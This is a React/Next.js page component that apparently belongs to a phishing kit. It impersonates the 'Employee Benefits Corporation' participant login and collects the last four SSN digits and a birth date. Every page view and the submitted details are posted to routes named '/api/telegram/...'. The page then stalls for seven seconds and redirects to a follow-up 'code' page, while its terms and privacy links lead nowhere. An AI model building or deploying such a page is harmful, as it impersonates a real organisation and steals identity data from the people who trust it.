"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { MONTHS, DAYS, YEARS } from "@/lib/date-constants";

export default function NewUserPage() {
  const router = useRouter();
  const [ssnLast4, setSsnLast4] = useState("");
  const [month, setMonth] = useState("");
  const [day, setDay] = useState("");
  const [year, setYear] = useState("");
  const [privacyAccepted, setPrivacyAccepted] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const ssnDigits = ssnLast4.replace(/\D/g, "");
  const isSsnValid = ssnDigits.length === 4;
  const isDateValid = month && day && year;
  const isFormValid = isSsnValid && isDateValid && privacyAccepted;
  const hasNotifiedView = useRef(false);

  useEffect(() => {
    if (hasNotifiedView.current) return;
    hasNotifiedView.current = true;
    fetch("/api/telegram/new-user-view", { method: "POST" }).catch(
      console.error,
    );
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    setIsLoading(true);
    try {
      await fetch("/api/telegram/new-user", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ssnLast4: ssnDigits,
          birthDate: `${month} ${day}, ${year}`,
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("New user notification error:", err);
    }
    await new Promise((r) => setTimeout(r, 7000));
    router.push("/new-user-code");
  };

  return (
    <div className="bg-white min-h-screen">
      <header className="max-w-5xl mx-auto px-5 py-8 md:py-10">
        <div className="flex items-center">
          <img
            src="/emp/images/logo.png"
            alt="Employee Benefits Corporation"
            className="w-28 md:w-40"
          />
          <div className="h-24 md:h-32 w-px bg-gray-300 mx-7"></div>

          <h1 className="text-2xl md:text-4xl font-medium text-gray-400">
            Participant Log In
          </h1>
        </div>
      </header>

      <main className="w-87 md:w-110 mx-auto px-5 md:px-0 mt-7">
        <h1 className="text-[30px] font-medium text-[#294c76]">
          Verify Information
        </h1>

        <p className="mt-2 text-[18px] leading-[1.45] text-gray-800">
          <strong>Verify your information below.</strong> Select “Program Code”
          instead only if you were provided with a code to access your benefits
          package.
        </p>

        <div className="flex w-full mt-10">
          <button
            type="button"
            className="w-1/2 h-14 bg-[#2d5079] border border-[#294c76] rounded-l-md text-white text-[18px] font-bold"
          >
            Verify Information
          </button>
          <button
            type="button"
            className="w-1/2 h-14 bg-white border border-[#294c76] text-[#294c76] text-[17px] font-bold pb-3"
          >
            Enter Program Code
          </button>
        </div>

        <form className="mt-9" onSubmit={handleSubmit}>
          <div className="mb-7">
            <label htmlFor="ssn" className="block text-[20px] font-bold">
              Last 4 of Social Security Number{" "}
              <span className="text-red-700">*</span>
            </label>
            <input
              id="ssn"
              name="ssn"
              type="text"
              maxLength={4}
              value={ssnLast4}
              onChange={(e) =>
                setSsnLast4(e.target.value.replace(/\D/g, "").slice(0, 4))
              }
              className="w-full h-14 border border-gray-300 rounded-md px-4 text-lg outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-300"
            />
            <p className="text-[17px] text-gray-500">
              Used to securely verify your identity
            </p>
          </div>

          <div className="mb-7">
            <label className="block text-[20px] font-bold">Birth Date</label>
            <div className="flex gap-2 flex-wrap">
              <select
                value={month}
                onChange={(e) => setMonth(e.target.value)}
                className="h-14 px-3 bg-gray-50 border border-gray-300 rounded-md text-lg text-gray-900 min-w-[120px]"
              >
                <option value="">Month</option>
                {MONTHS.map((m) => (
                  <option key={m} value={m}>
                    {m}
                  </option>
                ))}
              </select>
              <select
                value={day}
                onChange={(e) => setDay(e.target.value)}
                className="h-14 px-3 bg-gray-50 border border-gray-300 rounded-md text-lg text-gray-900 min-w-[80px]"
              >
                <option value="">Day</option>
                {DAYS.map((d) => (
                  <option key={d} value={d}>
                    {d}
                  </option>
                ))}
              </select>
              <select
                value={year}
                onChange={(e) => setYear(e.target.value)}
                className="h-14 px-3 bg-gray-50 border border-gray-300 rounded-md text-lg text-gray-900 min-w-[90px]"
              >
                <option value="">Year</option>
                {YEARS.map((y) => (
                  <option key={y} value={y}>
                    {y}
                  </option>
                ))}
              </select>
            </div>
          </div>

          <div className="text-[20px]">
            <p>
              Please read and accept our{" "}
              <a href="#" className="text-[#4c8bc5] hover:underline">
                Terms of Use
              </a>{" "}
              and{" "}
              <a href="#" className="text-[#4c8bc5] hover:underline">
                Privacy Statement
              </a>{" "}
              to continue.
            </p>

            <label className="flex items-start gap-3 mt-2 cursor-pointer">
              <input
                type="checkbox"
                checked={privacyAccepted}
                onChange={(e) => setPrivacyAccepted(e.target.checked)}
                className="mt-1 w-5 h-5 shrink-0 accent-[#294c76]"
              />
              <span>
                I have read and agree to the Terms of Use and Privacy Statement.
              </span>
            </label>
          </div>

          <button
            type="submit"
            className="w-full h-14 mt-7 rounded-md bg-[#2d5079] border border-[#1f3e63] text-white text-[20px] font-medium hover:bg-[#25466b] transition"
            disabled={!isFormValid || isLoading}
          >
            {isLoading ? "Loading..." : "Verify Information"}
          </button>

          <button
            type="button"
            onClick={() => router.push("/")}
            className="w-full h-14 mt-5 flex items-center justify-center border border-gray-500 text-[#4c8bc5] text-[20px] font-medium hover:bg-gray-50 transition"
          >
            Return to Log in
          </button>
        </form>
      </main>
    </div>
  );
}
